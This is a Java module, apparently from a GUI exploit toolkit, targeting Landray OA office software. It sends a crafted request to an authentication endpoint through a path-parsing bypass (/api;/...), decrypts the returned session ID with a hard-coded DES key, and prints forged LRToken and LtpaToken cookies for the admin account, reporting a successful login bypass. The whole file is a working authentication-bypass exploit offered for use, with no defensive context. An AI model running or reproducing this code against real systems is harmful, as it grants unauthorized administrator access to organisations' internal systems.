package exp.oa.landrayoa;

import com.alibaba.fastjson.JSON;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import java.util.Base64;
import java.util.HashMap;

public class landray_getLoginSessionId_unauth implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(()-> {
            textArea.appendText("\n 未授权访问需替换cookie");
            textArea.appendText("\n ");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String decrypt(String content, String key) throws Exception {
        byte[] encryptedBytes = Base64.getDecoder().decode(content);

        DESKeySpec desKeySpec = new DESKeySpec(key.getBytes());
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
        SecretKey secretKey = keyFactory.generateSecret(desKeySpec);

        Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);

        byte[] decryptedBytes = cipher.doFinal(encryptedBytes);

        return new String(decryptedBytes, "UTF-8");
    }

    public Boolean att(String url,TextArea textArea){
        try{
            String data = "loginName=admin";
            HashMap head = new HashMap();
            head.put("Content-Type","application/x-www-form-urlencoded");
            Response post = HttpTools.post(url+"/api;/sys-authentication/loginService/getLoginSessionId.html",data,head,"utf-8");
            if(post.getCode()==200 && post.getText().contains("sessionId")){
                String sessionId= JSON.parseObject(post.getText()).get("sessionId").toString();
                String var1 = decrypt(new String(Base64.getDecoder().decode(sessionId)).replace("\r",""),"kmssSecu");
                String var2 = var1.substring(var1.indexOf("&id=")+4);
                Platform.runLater(()-> {
                    textArea.appendText("\n [ landray_getLoginSessionId_unauth ]");
                    textArea.appendText("\n 登录认证绕过成功");
                    textArea.appendText("\n url: "+url+"/sys/");
                    textArea.appendText("\n Cookie: "+"LRToken="+var2+"; LtpaToken="+var2);
                    textArea.appendText("\n ");
                });
                return true;

            }
        }catch (Exception e){
            return false;
        }
        return false;
    }
}
